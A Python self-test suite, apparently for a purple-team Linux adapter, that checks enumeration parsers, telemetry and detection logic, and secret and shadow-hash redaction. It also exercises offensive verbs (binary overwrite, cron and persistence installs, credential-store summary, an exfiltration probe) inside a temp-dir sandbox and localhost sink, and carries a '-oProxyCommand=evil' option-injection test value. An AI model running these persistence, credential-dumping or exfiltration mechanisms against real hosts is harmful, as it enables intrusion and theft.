    check("id.euid_root", idp["euid"]["id"] == 0, idp.get("euid"))
    check("id.groups", {g["name"] for g in idp["groups"]} == {"kali", "adm", "sudo", "docker"})

    SUDO_L = (
        "Matching Defaults entries for kali on kali:\n"
        "    env_reset, mail_badpass\n\n"
        "User kali may run the following commands on kali:\n"
        "    (ALL : ALL) ALL\n"
        "    (root) NOPASSWD: /usr/bin/systemctl restart nginx\n"
    )
    sudo = parse_sudo_l(SUDO_L)
    check("sudo.full_root", sudo["full_root"] is True, sudo)
    check("sudo.nopasswd", sudo["nopasswd_any"] is True, sudo)
    check("sudo.entries", len(sudo["entries"]) == 2, sudo["entries"])

    check("caps.decode_min",
          decode_caps("0000000000000000") == [], decode_caps("0000000000000000"))
    caps_full = decode_caps("000001ffffffffff")
    check("caps.decode_full_has_sys_admin", "sys_admin" in caps_full, caps_full)
    check("caps.decode_single_chown", decode_caps("0000000000000001") == ["chown"])
    check("caps.decode_net_bind", decode_caps("0000000000000400") == ["net_bind_service"])

    STATUS = (
        "Name:\tsshd\n"
        "State:\tS (sleeping)\n"
        "Tgid:\t812\n"
        "Pid:\t812\n"
        "PPid:\t1\n"
        "Uid:\t0\t0\t0\t0\n"
        "Gid:\t0\t0\t0\t0\n"
        "CapEff:\t000001ffffffffff\n"
        "Seccomp:\t0\n"
    )
    st = parse_proc_status(STATUS)
    check("status.name", st["name"] == "sshd", st)
    check("status.ppid", st["ppid"] == 1, st)
    check("status.uid", st["uid"]["real"] == 0 and st["uid"]["effective"] == 0, st.get("uid"))
    check("status.caps", "sys_admin" in st["cap_effective"], st.get("cap_effective"))

    # /proc/<pid>/stat with a nasty comm containing spaces and parens.
    STAT = "812 (nasty )( comm) S 1 812 812 0 -1 4194560 100 0 0 0 1 2 0 0 20 0 1 0"
    ps = parse_proc_stat(STAT)
    check("stat.pid", ps["pid"] == 812, ps)
    check("stat.comm_with_parens", ps["comm"] == "nasty )( comm", ps.get("comm"))
    check("stat.state", ps["state"] == "S", ps)
    check("stat.ppid", ps["ppid"] == 1, ps)

    CMDLINE = "/usr/sbin/sshd\x00-D\x00-o\x00LogLevel=INFO\x00"
    check("cmdline.split", parse_proc_cmdline(CMDLINE) == ["/usr/sbin/sshd", "-D", "-o", "LogLevel=INFO"])
    check("cmdline.empty", parse_proc_cmdline("\x00") == [])

    # ---- services ----
    SYSTEMCTL_SHOW = (
        "Id=ssh.service\n"
        "ExecStart={ path=/usr/sbin/sshd ; argv[]=/usr/sbin/sshd -D $SSHD_OPTS ; ignore_errors=no }\n"
        "FragmentPath=/lib/systemd/system/ssh.service\n"
        "UnitFileState=enabled\n"
        "ActiveState=active\n"
        "SubState=running\n"
        "\n"
        "Id=cron.service\n"
        "ExecStart={ path=/usr/sbin/cron ; argv[]=/usr/sbin/cron -f ; ignore_errors=no }\n"
        "FragmentPath=/lib/systemd/system/cron.service\n"
        "UnitFileState=enabled\n"
        "ActiveState=active\n"
        "SubState=running\n"
    )
    shows = parse_systemctl_show(SYSTEMCTL_SHOW)
    check("show.count", len(shows) == 2, shows)
    ssh = next(s for s in shows if s["unit"] == "ssh.service")
    check("show.exec_path", ssh["exec_start"] == "/usr/sbin/sshd", ssh)
    check("show.state", ssh["start_type"] == "enabled", ssh)

    SYSTEMCTL_UNITS = (
        "UNIT              LOAD   ACTIVE   SUB     DESCRIPTION\n"
        "ssh.service       loaded active   running OpenBSD Secure Shell server\n"
        "cron.service      loaded active   running Regular background program processing daemon\n"
        "apache2.service   loaded failed   failed  The Apache HTTP Server\n"
        "\n"
        "3 loaded units listed.\n"
    )
    units = parse_systemctl_units(SYSTEMCTL_UNITS)
    check("units.count", len(units) == 3, [u["unit"] for u in units])
    ap = next(u for u in units if u["unit"] == "apache2.service")
    check("units.failed_desc", ap["active"] == "failed" and ap["description"] == "The Apache HTTP Server", ap)

    UNIT_FILES = (
        "UNIT FILE                 STATE    PRESET\n"
        "ssh.service               enabled  enabled\n"
        "cron.service              enabled  enabled\n"
        "rescue.service            static   -\n"
        "telnet.service            masked   masked\n"
    )
    uf = parse_systemctl_unit_files(UNIT_FILES)
    check("unitfiles.enabled", uf["ssh.service"] == "enabled", uf)
    check("unitfiles.masked", uf["telnet.service"] == "masked", uf)

    # ---- persistence ----
    CRONTAB_SYS = (
        "# /etc/crontab\n"
        "SHELL=/bin/sh\n"
        "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n"
        "17 *  * * *   root    cd / && run-parts --report /etc/cron.hourly\n"
        "@reboot       root    /opt/app/boot.sh\n"
    )
    csys = parse_crontab(CRONTAB_SYS, system=True)
    check("cron.sys_count", len(csys) == 2, csys)
    check("cron.sys_user", csys[0]["user"] == "root", csys[0])
    check("cron.sys_reboot", csys[1]["schedule"] == "@reboot" and csys[1]["user"] == "root", csys[1])
    check("cron.sys_cmd", csys[0]["command"].startswith("cd / &&"), csys[0])

    CRONTAB_USER = (
        "# m h  dom mon dow   command\n"
        "*/5 * * * * /home/kali/beacon.sh\n"
        "@daily /usr/bin/backup\n"
    )
    cuser = parse_crontab(CRONTAB_USER, system=False)
    check("cron.user_count", len(cuser) == 2, cuser)
    check("cron.user_cmd", cuser[0]["command"] == "/home/kali/beacon.sh", cuser[0])
    check("cron.user_daily", cuser[1]["schedule"] == "@daily", cuser[1])

    DESKTOP = (
        "[Desktop Entry]\n"
        "Type=Application\n"
        "Name=Suspicious Updater\n"
        "Exec=/home/kali/.cache/update.sh\n"
        "X-GNOME-Autostart-enabled=true\n"
    )
    d = parse_desktop_autostart(DESKTOP)
    check("autostart.name", d["name"] == "Suspicious Updater", d)
    check("autostart.exec", d["exec"] == "/home/kali/.cache/update.sh", d)
    check("autostart.enabled", d["enabled"] is True, d)
    DESKTOP_HIDDEN = "[Desktop Entry]\nName=X\nExec=/bin/true\nHidden=true\n"
    check("autostart.hidden", parse_desktop_autostart(DESKTOP_HIDDEN)["enabled"] is False)

    # ---- network ----
    SS = (
        "tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:((\"sshd\",pid=812,fd=3))\n"
        "tcp   LISTEN 0      511             [::]:80           [::]:*    users:((\"nginx\",pid=940,fd=6),(\"nginx\",pid=941,fd=6))\n"
        "udp   UNCONN 0      0         127.0.0.1:53         0.0.0.0:*    users:((\"named\",pid=700,fd=4))\n"
        "tcp   ESTAB  0      0       192.168.1.10:22    192.168.1.5:51314 users:((\"sshd\",pid=1200,fd=4))\n"
    )
    socks = parse_ss(SS)
    check("ss.count", len(socks) == 4, len(socks))
    sshd = socks[0]
    check("ss.port", sshd["local_port"] == "22", sshd)
    check("ss.proc", sshd["processes"] == [{"name": "sshd", "pid": 812}], sshd["processes"])
    nginx = socks[1]
    check("ss.ipv6_addr", nginx["local_address"] == "[::]", nginx)
    check("ss.multi_proc", len(nginx["processes"]) == 2, nginx["processes"])

    NETSTAT = (
        "Active Internet connections (only servers)\n"
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n"
        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      812/sshd\n"
        "udp        0      0 127.0.0.1:53            0.0.0.0:*                           700/named\n"
    )
    ns = parse_netstat(NETSTAT)
    check("netstat.count", len(ns) == 2, ns)
    check("netstat.tcp", ns[0]["local_port"] == "22" and ns[0]["state"] == "LISTEN", ns[0])
    check("netstat.udp_proc", ns[1]["processes"] == [{"name": "named", "pid": 700}], ns[1])

    IP_ADDR = (
        "1: lo    inet 127.0.0.1/8 scope host lo\\       valid_lft forever preferred_lft forever\n"
        "2: eth0    inet 192.168.1.10/24 brd 192.168.1.255 scope global eth0\\       valid_lft forever\n"
        "2: eth0    inet6 fe80::5054:ff:fe12:3456/64 scope link \\       valid_lft forever\n"
    )
    ipa = parse_ip_addr(IP_ADDR)
    check("ipaddr.count", len(ipa) == 3, ipa)
    check("ipaddr.eth0", ipa[1]["iface"] == "eth0" and ipa[1]["address"] == "192.168.1.10/24", ipa[1])

    IP_ROUTE = (
        "default via 192.168.1.1 dev eth0 proto dhcp metric 100\n"
        "192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.10\n"
    )
    ipr = parse_ip_route(IP_ROUTE)
    check("iproute.default", ipr[0]["via"] == "192.168.1.1" and ipr[0]["dev"] == "eth0", ipr[0])

    # ---- software ----
    DPKG = (
        "bash\t5.2.15-2+b7\tamd64\tii \n"
        "sudo\t1.9.13p3-1+deb12u1\tamd64\tii \n"
        "libssl3\t3.0.11-1~deb12u2\tamd64\tii \n"
        "removed-pkg\t1.0\tamd64\trc \n"
    )
    dpkg = parse_dpkg_query(DPKG)
    check("dpkg.count", len(dpkg) == 4, dpkg)
    check("dpkg.installed", next(p for p in dpkg if p["name"] == "bash")["installed"] is True)
    check("dpkg.removed", next(p for p in dpkg if p["name"] == "removed-pkg")["installed"] is False)

    RPM = (
        "bash\t5.1.8-9.el9\tx86_64\n"
        "sudo\t1.9.5p2-10.el9_3\tx86_64\n"
        "openssl\t3.0.7-25.el9_3\tx86_64\n"
    )
    rpm = parse_rpm_qa(RPM)
    check("rpm.count", len(rpm) == 3, rpm)
    check("rpm.version", next(p for p in rpm if p["name"] == "sudo")["version"] == "1.9.5p2-10.el9_3")

    # ---- shares ----
    EXPORTS = (
        "# /etc/exports\n"
        "/srv/nfs/share   192.168.1.0/24(rw,sync,no_root_squash) 10.0.0.5(ro)\n"
        '"/srv/my share"  *(ro,sync)\n'
    )
    exp = parse_exports(EXPORTS)
    check("exports.count", len(exp) == 2, exp)
    check("exports.path", exp[0]["path"] == "/srv/nfs/share", exp[0])
    check("exports.norootsquash", "no_root_squash" in exp[0]["clients"][0]["options"], exp[0])
    check("exports.quoted_path", exp[1]["path"] == "/srv/my share", exp[1])
    check("exports.wildcard", exp[1]["clients"][0]["host"] == "*", exp[1])

    SMB = (
        "[global]\n"
        "   workgroup = WORKGROUP\n"
        "   map to guest = Bad User\n"
        "[public]\n"
        "   path = /srv/samba/public\n"
        "   read only = no\n"
        "   guest ok = yes\n"
        "; a comment\n"
        "[private]\n"
        "   path = /srv/samba/private\n"
        "   valid users = kali\n"
    )
    smb = parse_smb_conf(SMB)
    check("smb.count", len(smb) == 2, [s["name"] for s in smb])
    pub = next(s for s in smb if s["name"] == "public")
    check("smb.path", pub["path"] == "/srv/samba/public", pub)
    check("smb.guest", pub["options"].get("guestok") == "yes", pub["options"])
    check("smb.readonly", pub["options"].get("readonly") == "no", pub["options"])

    # ---- detect ----
    AUDITCTL = (
        "-a always,exit -F arch=b64 -S execve -F key=exec\n"
        "-w /etc/shadow -p wa -k identity\n"
        "-w /etc/passwd -p wa -k identity\n"
    )
    rules = parse_auditctl_l(AUDITCTL)
    check("auditctl.count", len(rules) == 3, rules)
    check("auditctl.execve", "execve" in rules[0]["syscalls"], rules[0])
    check("auditctl.exec_key", rules[0]["key"] == "exec", rules[0])
    check("auditctl.shadow_watch", rules[1]["watch"] == "/etc/shadow" and rules[1]["key"] == "identity", rules[1])

    # The load-bearing telemetry honesty test: auditd installed but stopped.
    tel_stopped = assess_telemetry(
        auditd_installed=True, auditd_running=False,
        auditctl_rules="", rulesd_files=["10-exec.rules", "20-identity.rules"],
        journald_running=True, journald_persistent=True, rsyslog_running=True)
    check("telemetry.stopped_not_effective",
          tel_stopped["any_process_telemetry"] is False, tel_stopped)
    check("telemetry.stopped_rules_loaded_zero",
          tel_stopped["auditd"]["rules_loaded"] == 0, tel_stopped["auditd"])
    check("telemetry.stopped_configured_seen",
          tel_stopped["auditd"]["rules_configured"] == 2, tel_stopped["auditd"])
    check("telemetry.stopped_gap_mentions_running",
          any("not running" in g.lower() for g in tel_stopped["gaps"]), tel_stopped["gaps"])

    tel_running = assess_telemetry(
        auditd_installed=True, auditd_running=True,
        auditctl_rules=AUDITCTL, rulesd_files=["10-exec.rules"],
        journald_running=True, journald_persistent=True, rsyslog_running=True)
    check("telemetry.running_effective",
          tel_running["any_process_telemetry"] is True, tel_running)
    check("telemetry.running_keys", "exec" in tel_running["auditd"]["keys"], tel_running["auditd"])

    tel_absent = assess_telemetry(
        auditd_installed=False, auditd_running=False,
        auditctl_rules="", rulesd_files=[],
        journald_running=True, journald_persistent=False, rsyslog_running=False)
    check("telemetry.absent_gap",
          any("not installed" in g for g in tel_absent["gaps"]), tel_absent["gaps"])
    check("telemetry.volatile_gap",
          any("volatile" in g for g in tel_absent["gaps"]), tel_absent["gaps"])

    AUSEARCH = (
        "----\n"
        "type=SYSCALL msg=audit(1700000000.123:456): arch=c000003e syscall=59 "
        "success=yes exe=\"/usr/bin/whoami\" key=\"exec\"\n"
        "type=EXECVE msg=audit(1700000000.123:456): argc=1 a0=\"whoami\"\n"
        "----\n"
        "type=SYSCALL msg=audit(1700000001.500:457): arch=c000003e syscall=59 "
        "success=yes exe=\"/usr/bin/id\" key=\"exec\"\n"
    )
    check("ausearch.count_all", count_ausearch_records(AUSEARCH) == 2, count_ausearch_records(AUSEARCH))
    check("ausearch.count_key", count_ausearch_records(AUSEARCH, key="exec") == 2)
    check("ausearch.count_image", count_ausearch_records(AUSEARCH, image="/usr/bin/whoami") == 1)
    check("ausearch.count_none", count_ausearch_records(AUSEARCH, key="cred") == 0)
    # Only the first event carries a type=EXECVE record; the EXECVE filter that
    # keeps detect.process_creation honest must count that one and not the bare
    # SYSCALL event.
    check("ausearch.record_type_execve",
          count_ausearch_records(AUSEARCH, record_type="EXECVE") == 1,
          count_ausearch_records(AUSEARCH, record_type="EXECVE"))
    # auditd emits these from PAM/systemd with no rules loaded. Counting them as
    # process creation was the false positive that deleted the detection gap.
    AUSEARCH_NOISE = (
        "----\n"
        "type=USER_AUTH msg=audit(1700000000.1:1): pid=900 uid=0 "
        "msg='op=PAM:authentication acct=\"kali\" exe=\"/usr/bin/sudo\" res=success'\n"
        "----\n"
        "type=CRED_ACQ msg=audit(1700000001.2:2): pid=901 uid=0 "
        "msg='op=PAM:setcred acct=\"kali\" res=success'\n"
    )
    check("ausearch.noise_all_counted", count_ausearch_records(AUSEARCH_NOISE) == 2)
    check("ausearch.noise_not_execve",
          count_ausearch_records(AUSEARCH_NOISE, record_type="EXECVE") == 0,
          count_ausearch_records(AUSEARCH_NOISE, record_type="EXECVE"))

    AUTH_LOG = (
        "Jan 10 10:00:01 host sshd[812]: Accepted publickey for kali from 192.168.1.5 port 51314 ssh2\n"
        "Jan 10 10:01:15 host sshd[820]: Failed password for root from 10.0.0.9 port 40122 ssh2\n"
        "Jan 10 10:02:00 host sudo:     kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/id\n"
        "Jan 10 10:03:10 host sudo:     kali : authentication failure; logname=kali uid=1000\n"
    )
    auth = parse_auth_events(AUTH_LOG)
    check("auth.accepted", auth["accepted"] == 1, auth)
    check("auth.failed", auth["failed"] >= 1, auth)
    check("auth.sudo", auth["sudo"] == 1, auth)
    check("auth.sudo_failed", auth["sudo_failed"] == 1, auth)

    # ---- auth.log time-window filter (the fallback that used to ignore it) ----
    # Anchor "now" to just after the AUTH_LOG lines so the window is deterministic.
    NOW = time.mktime((time.localtime().tm_year, 1, 10, 10, 4, 0, 0, 0, -1))
    win, parsed = filter_auth_window(AUTH_LOG, 300, now=NOW)
    check("authwin.parses", parsed is True)
    check("authwin.in_window_total", parse_auth_events(win)["total"] == 4,
          parse_auth_events(win))
    # A one-second window keeps nothing: the file is full of records but none are
    # recent, which is exactly the case the old whole-file tally got wrong.
    win_narrow, _ = filter_auth_window(AUTH_LOG, 1, now=NOW)
    check("authwin.excludes_old", parse_auth_events(win_narrow)["total"] == 0,
          parse_auth_events(win_narrow))
    # A December line tailed in January belongs to last year, not eleven months
    # ahead: reconstructing it as this year would push it out of every window.
    DEC = "Dec 31 23:59:59 host sshd[9]: Accepted publickey for kali from ::1 port 1 ssh2\n"
    jan_now = time.mktime((2027, 1, 1, 0, 0, 30, 0, 0, -1))
    dec_win, dec_parsed = filter_auth_window(DEC, 300, now=jan_now)
    check("authwin.dec_jan_rollover",
          dec_parsed and parse_auth_events(dec_win)["total"] == 1, dec_win)
    # No parseable timestamp anywhere → the caller must be told it cannot tell.
    no_ts, no_parsed = filter_auth_window("garbage line with no timestamp\n", 300, now=NOW)
    check("authwin.unparseable_flagged", no_parsed is False and no_ts == "")

    # ---- vuln ----
    m = statmod.S_IFREG | 0o777
    issue = classify_perm_issue("/usr/local/bin/x", m, 0, current_uid=1000)
    check("perm.world_writable", "world_writable" in issue["issues"], issue)
    check("perm.root_owned_writable", "root_owned_but_writable" in issue["issues"], issue)
    suid = classify_perm_issue("/usr/bin/passwd", statmod.S_IFREG | statmod.S_ISUID | 0o755, 0, current_uid=1000)
    check("perm.setuid_root", suid and "setuid_root" in suid["issues"], suid)
    clean = classify_perm_issue("/usr/bin/ls", statmod.S_IFREG | 0o755, 0, current_uid=1000)
    check("perm.clean_none", clean is None, clean)

    SECRETS = (
        "export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI7bQxHb0987654321EXAMPLEKEY\n"
        "password = SuperSecret123!\n"
        "db_url = postgres://admin:hunter2@db.internal:5432/app\n"
        "API_KEY: ghp_ABCdef123456789012345678901234567890\n"
        "aws_key = AKIAIOSFODNN7EXAMPLE\n"
        "password = changeme\n"
        "# just a note about passwords\n"
        "-----BEGIN OPENSSH PRIVATE KEY-----\n"
    )
    secrets = find_secrets(SECRETS, source="/home/kali/.env")
    kinds = {s["kind"] for s in secrets}
    check("secrets.aws_secret", "aws_secret_access_key" in kinds, kinds)
    check("secrets.password", "password_assignment" in kinds, kinds)
    check("secrets.conn_string", "connection_string_password" in kinds, kinds)
    check("secrets.api_key", "api_key_assignment" in kinds, kinds)
    check("secrets.aws_id", "aws_access_key_id" in kinds, kinds)
    # The private-key BEGIN line is a marker with no capture group; the old
    # placeholder filter treated its empty "value" as a placeholder and dropped
    # every hit, so the highest-severity kind was invisible on Linux.
    check("secrets.private_key", "private_key_block" in kinds, kinds)
    pk = next(s for s in secrets if s["kind"] == "private_key_block")
    check("secrets.private_key_length", pk["value_length"] > 0, pk)
    check("secrets.placeholder_dropped",
          not any(s["line"] == 6 for s in secrets), [s["line"] for s in secrets])
    # The redaction contract: no secret material anywhere in the output.
    blob = json.dumps(secrets)
    for leaked in ("SuperSecret123!", "hunter2", "wJalrXUtnFEMI7bQxHb0987654321EXAMPLEKEY",
                   "ghp_ABCdef123456789012345678901234567890"):
        check(f"secrets.no_leak[{leaked[:8]}]", leaked not in blob, "LEAKED SECRET")
    # AKIA prefix appears in a match but the secret-key material must not.
    check("secrets.value_redacted", all(s["value"] == "***redacted***" for s in secrets))

    SHADOW = (
        "root:$6$abcd1234$EXAMPLEHASHmaterialthatmustnotleak0123456789:19000:0:99999:7:::\n"
        "daemon:*:19000:0:99999:7:::\n"
        "kali:$y$j9T$SOMEyescryptHASHvalue$anotherpart:19000:0:99999:7:::\n"
        "backup:!:19000:0:99999:7:::\n"
        "guest::19000:0:99999:7:::\n"
    )
    summ = summarize_shadow(SHADOW, redact=True)
    check("shadow.hashed_count", summ["hashed_count"] == 2, summ)
    check("shadow.empty_count", summ["empty_password_count"] == 1, summ)
    root_acc = next(a for a in summ["accounts"] if a["user"] == "root")
    check("shadow.root_scheme", root_acc["scheme"] == "sha512crypt", root_acc)
    check("shadow.root_no_hash_field", "hash" not in root_acc, root_acc)
    check("shadow.locked", next(a for a in summ["accounts"] if a["user"] == "backup")["state"] == "locked")
    check("shadow.empty", next(a for a in summ["accounts"] if a["user"] == "guest")["state"] == "empty_password")
    # Redaction: the hash material must not appear anywhere.
    check("shadow.no_hash_leak", "EXAMPLEHASHmaterial" not in json.dumps(summ), "LEAKED HASH")
    # redact=False must include it (the documented, dangerous behaviour).
    summ_raw = summarize_shadow(SHADOW, redact=False)
    check("shadow.raw_includes_hash",
          "EXAMPLEHASHmaterial" in json.dumps(summ_raw), "redact=false should include hash")

    # patch gap
    pkgs = [
        {"name": "sudo", "version": "1.9.5p1"},   # < 1.9.5p2 -> vulnerable
        {"name": "polkit", "version": "0.119"},   # < 0.120  -> vulnerable
        {"name": "openssl", "version": "3.0.11"}, # >= 3.0.7 -> ok
    ]
    gap = assess_patch_gap(pkgs, min_severity="medium")
    gap_names = {g["name"] for g in gap}
    check("patchgap.sudo", "sudo" in gap_names, gap_names)
    check("patchgap.polkit", "polkit" in gap_names, gap_names)
    check("patchgap.openssl_ok", "openssl" not in gap_names, gap_names)
    gap_high = assess_patch_gap(pkgs, min_severity="critical")
    check("patchgap.severity_filter", len(gap_high) == 0, gap_high)

    # privilege paths
    chains = derive_privilege_paths(
        is_root=False, sudo={"full_root": True, "nopasswd_any": True},
        caps=["sys_admin"], groups=["docker", "kali"], writable_service_bins=["/opt/svc/bin"])
    ids = {c["id"] for c in chains}
    check("privpath.sudo_all", "sudo-all" in ids, ids)
    check("privpath.docker", "group-docker" in ids, ids)
    check("privpath.cap", "cap-sys_admin" in ids, ids)
    check("privpath.writable_svc", any(c["id"].startswith("writable-service-bin") for c in chains), ids)
    check("privpath.root_empty", derive_privilege_paths(
        is_root=True, sudo={}, caps=[], groups=[], writable_service_bins=[]) == [])

    # audit rule mapping (harden)
    check("harden.execve_rule", "execve" in (_audit_rule_for("execve") or ""), _audit_rule_for("execve"))
    check("harden.unknown_rule", _audit_rule_for("nonexistent") is None)

    # ssh outcome classification (lateral move)
    check("ssh.auth_ok", interpret_ssh_result(0, "")["authenticated"] is True)
    denied = interpret_ssh_result(255, "kali@host: Permission denied (publickey).")
    check("ssh.denied_reached", denied["reached"] is True and denied["authenticated"] is False, denied)
    refused = interpret_ssh_result(255, "ssh: connect to host x port 22: Connection refused")
    check("ssh.refused", refused["reached"] is False, refused)

    # option-injection guard: a leading-dash destination/user must be refused.
    _guard_raised = False
    try:
        _reject_option_injection("-oProxyCommand=evil", "root")
    except AdapterError:
        _guard_raised = True
    check("optinject.refuses_dash", _guard_raised is True)
    _guard_ok = True
    try:
        _reject_option_injection("192.168.1.5", "kali")
    except AdapterError:
        _guard_ok = False
    check("optinject.allows_normal", _guard_ok is True)

    # ---- red-verb mechanisms against a throwaway SANDBOX only ----
    with tempfile.TemporaryDirectory(prefix="whetstone-selftest-") as sb:
        # service_permissions: overwrite + restore a fake binary.
        target = os.path.join(sb, "fake-service-bin")
        with open(target, "wb") as fh:
            fh.write(b"ORIGINAL-BINARY-CONTENT")
        rec = _overwrite_binary(target, b"PAYLOAD", restore=True)
        check("overwrite.ok", rec["ok"] is True, rec)
        check("overwrite.records_target", rec["changed"]["overwrote"] == target, rec)
        check("overwrite.restored", rec.get("restored") is True, rec)
        with open(target, "rb") as fh:
            check("overwrite.restore_correct", fh.read() == b"ORIGINAL-BINARY-CONTENT")
        # no-restore path leaves payload, honestly reports no restore
        rec2 = _overwrite_binary(target, b"PAYLOAD2", restore=False)
        check("overwrite.no_restore", "restored" not in rec2, rec2)
        with open(target, "rb") as fh:
            check("overwrite.payload_present", fh.read() == b"PAYLOAD2")

        # scheduled_task: write + remove a cron drop-in in the sandbox.
        job = _write_cron_job(sb, "whetstone-demo", "* * * * *", "/bin/true", as_user="root")
        check("cron.written", os.path.isfile(job["path"]), job)
        check("cron.records_line", "root /bin/true" in job["line"], job)
        os.remove(job["path"])
        check("cron.removed", not os.path.exists(job["path"]))

        # scheduled_task proof marker: unpredictable name, exists on return, and a
        # second call never collides — the property that closes the fixed-/tmp-path
        # symlink overwrite. Point it at the sandbox so we do not litter /tmp.
        marker1 = _create_proof_marker(dir=sb)
        marker2 = _create_proof_marker(dir=sb)
        check("marker.created", os.path.isfile(marker1), marker1)
        check("marker.unpredictable", marker1 != marker2, (marker1, marker2))
        check("marker.not_fixed_name",
              not marker1.endswith("whetstone-scheduled-task.proof"), marker1)
        os.remove(marker1)
        os.remove(marker2)

        # persistence_install: each mechanism creates + cleans its artefact.
        for mech in ("autorun", "cron", "service", "profile"):
            pr = _install_persistence(mech, os.path.join(sb, mech), cleanup=True)
            check(f"persist.{mech}.recorded", "installed_path" in pr, pr)
            check(f"persist.{mech}.cleaned", pr.get("cleaned_up") is True, pr)
            check(f"persist.{mech}.gone", not os.path.exists(pr["installed_path"]), pr)
        # no-cleanup leaves the artefact and says so
        pr_keep = _install_persistence("autorun", os.path.join(sb, "keep"), cleanup=False)
        check("persist.no_cleanup_left", os.path.exists(pr_keep["installed_path"]), pr_keep)
        check("persist.no_cleanup_flag", "cleaned_up" not in pr_keep, pr_keep)

    # credential store summary shaping (no root needed; drive with fixture text)
    cs = _summarize_credential_store(SHADOW, redact=True)
    check("credstore.exposed", set(cs["exposed_accounts"]) == {"root", "kali", "guest"}, cs["exposed_accounts"])
    check("credstore.unreadable", _summarize_credential_store(None, redact=True)["readable"] is False)

    # exfil_probe against a throwaway localhost sink.
    received = {"n": 0}
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]

    def _accept() -> None:
        conn, _ = srv.accept()
        with conn:
            while True:
                chunk = conn.recv(65536)
                if not chunk:
                    break
                received["n"] += len(chunk)

    t = threading.Thread(target=_accept)
    t.start()
    res = _send_synthetic("127.0.0.1", port, 4096)
    t.join(timeout=5)
    srv.close()
    check("exfil.sent", res["ok"] is True and res["bytes_sent"] == 4096, res)
    check("exfil.received", received["n"] == 4096, received)

    # ---- adapter registration / coverage sanity ----
    adapter = LinuxAdapter()
    implemented = set(adapter.implemented())
    expected = {
        "enum.host", "enum.users", "enum.privileges", "enum.processes",
        "enum.services", "enum.persistence", "enum.network", "enum.software",
        "enum.shares", "vuln.patch_gap", "vuln.weak_permissions",
        "vuln.credential_exposure", "vuln.privilege_path", "detect.telemetry",
        "detect.process_creation", "detect.persistence_change",
        "detect.credential_access", "detect.authentication", "detect.rule",
        "exploit.service_permissions", "exploit.unquoted_path",
        "exploit.scheduled_task", "postex.credential_dump",
        "postex.persistence_install", "postex.privilege_escalate",
        "postex.lateral_move", "postex.exfil_probe", "harden.enable_telemetry",
        "harden.fix_permissions", "harden.remove_persistence",
    }
    check("adapter.all_implemented", expected <= implemented,
          f"missing: {expected - implemented}")
    check("adapter.no_report_verbs",
          not any(v.startswith("report.") for v in implemented), implemented)

    print(f"\n{passed} passed, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    import sys
    sys.exit(_run_self_tests())
